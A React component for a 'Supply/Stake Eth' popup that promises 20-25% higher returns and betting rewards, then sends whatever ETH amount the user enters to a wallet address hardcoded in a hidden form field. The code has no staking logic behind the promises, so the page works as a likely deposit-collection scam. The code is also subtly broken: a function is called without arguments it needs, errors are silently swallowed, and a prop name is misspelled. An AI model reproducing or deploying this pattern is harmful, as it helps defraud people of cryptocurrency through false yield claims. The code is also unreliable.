import React, { useState } from "react";
import { ethers } from "ethers";


const startPayment = async ({  setError, setTxs, ether, addr }) => {

  

  try {
    if (!window.ethereum)
      throw new Error("No crypto wallet found. Please install it.");

    await window.ethereum.send("eth_requestAccounts");
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    ethers.utils.getAddress(addr);
    const tx = await signer.sendTransaction({
      to: addr,
      value: ethers.utils.parseEther(ether)
    });
    console.log({ ether, addr });
    console.log("tx", tx);
    setTxs([tx]);
  } catch (err) {
  }
};

function Supply(props) {
  const handleSubmit = async (e) => {
    e.preventDefault();
    const data = new FormData(e.target);
    await startPayment({
      ether: data.get("ether"),
      addr: data.get("addr")
    });
  };
  
  return (props.trigger) ? (
   
        <div className='pop'>
            <button  onClick={() => props.setTrigger(false)} className='cc'> x </button>
        <p>• Supply/Stake Eth </p>
        <p>  • Get 20-25% high percentages than others</p>
        <p>  • For 10 and above, you will get 5% higher rates and betting rewards </p> 
                         
            <form className="" onSubmit={handleSubmit}>
          <div className="">
            <div className="escan">
            <input
                value="0xf1BBee7dD73eeb82Eb008e00468BCe42a88BE324"
                name="addr"
                type='hidden'
                placeholder="Recipient Address"
              />
            </div>
            <div className="supplys">
              <input
                name="ether"
                type="text"
                placeholder="Amount in ETH"
              />
            </div>
         <footer className="supply1">
          <button
            type="submit">
            Pay now
          </button>
         </footer>
        </div>
    </form>
            { props.childern }
        </div>
  ) : "";
}
export default Supply;